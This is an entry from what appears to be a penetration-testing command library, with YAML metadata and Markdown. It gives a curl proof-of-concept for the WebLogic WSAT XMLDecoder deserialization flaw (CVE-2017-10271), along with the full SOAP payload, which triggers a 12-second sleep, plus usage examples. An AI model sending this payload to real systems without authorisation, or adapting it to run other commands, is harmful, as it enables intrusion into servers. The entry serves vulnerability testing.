---
id: cmd-uuid-1
data: >-
  curl -X POST http://target:7001/wls-wsat/RegistrationPortTypeRPC -H
  "Content-Type: text/xml" -d '<?xml version="1.0"
  encoding="UTF-8"?><soapenv:Envelope
  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:wsa="http://www.w3.org/2005/08/addressing"
  xmlns:wsat="http://schemas.xmlsoap.org/ws/2004/10/wsat"><soapenv:Header><wsa:Action>wsat:register</wsa:Action><wsa:MessageID>uuid:1234</wsa:MessageID><wsa:ReplyTo><wsa:Address>http://fake</wsa:Address></wsa:ReplyTo><wsa:To>http://fake</wsa:To><wsat:ProtocolIdentifier>http://schemas.xmlsoap.org/ws/2004/10/wscoor</wsat:ProtocolIdentifier></soapenv:Header><soapenv:Body><java
  version="1.4.0" class="java.beans.XMLDecoder"><void
  class="java.lang.System"><void method="setSecurityManager"><object
  class="java.lang.SecurityManager"/></void></void><void
  class="java.lang.Thread"><void
  method="sleep"><long>12000</long></void></void></java></soapenv:Body></soapenv:Envelope>'
tags:
  - rce
  - exploit
  - http
type: command
output: HTTP/1.1 200 OK with ~12 second delay
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.850Z'
verified: false
validated: true
submitted: true
---
# curl-weblogic-rce-poc

## Command

```bash
curl -X POST http://target:7001/wls-wsat/RegistrationPortTypeRPC -H "Content-Type: text/xml" -d '<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wsat="http://schemas.xmlsoap.org/ws/2004/10/wsat"><soapenv:Header><wsa:Action>wsat:register</wsa:Action><wsa:MessageID>uuid:1234</wsa:MessageID><wsa:ReplyTo><wsa:Address>http://fake</wsa:Address></wsa:ReplyTo><wsa:To>http://fake</wsa:To><wsat:ProtocolIdentifier>http://schemas.xmlsoap.org/ws/2004/10/wscoor</wsat:ProtocolIdentifier></soapenv:Header><soapenv:Body><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.System"><void method="setSecurityManager"><object class="java.lang.SecurityManager"/></void></void><void class="java.lang.Thread"><void method="sleep"><long>12000</long></void></void></java></soapenv:Body></soapenv:Envelope>'
```

## Description

This command uses curl to send a POST request with a crafted SOAP XML payload exploiting CVE-2017-10271 in WebLogic WSAT, triggering deserialization for RCE. Use it to test vulnerable servers by observing a 12-second response delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://target:7001/wls-wsat/RegistrationPortTypeRPC` | Target endpoint URL (replace target with IP/hostname) | Yes |
| `-H "Content-Type: text/xml"` | Sets XML content type header | Yes |
| `-d '...' ` | The SOAP XML payload with embedded XMLDecoder for sleep | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://192.168.1.100:7001/wls-wsat/RegistrationPortTypeRPC -H "Content-Type: text/xml" -d '[payload]'
```

### Advanced Usage

```bash
(time curl -X POST http://target:7001/wls-wsat/RegistrationPortTypeRPC -H "Content-Type: text/xml" -d '[payload]') > response.txt 2>&1
```

Prefix with `time` to measure delay and redirect output.

## Expected Output

A delayed HTTP 200 OK response after ~12 seconds, with minimal body content. No delay indicates patching or failure.

## Related

- [[procedures/Exploit-CVE-2017-10271-for-RCE-in-WebLogic-WSAT]]
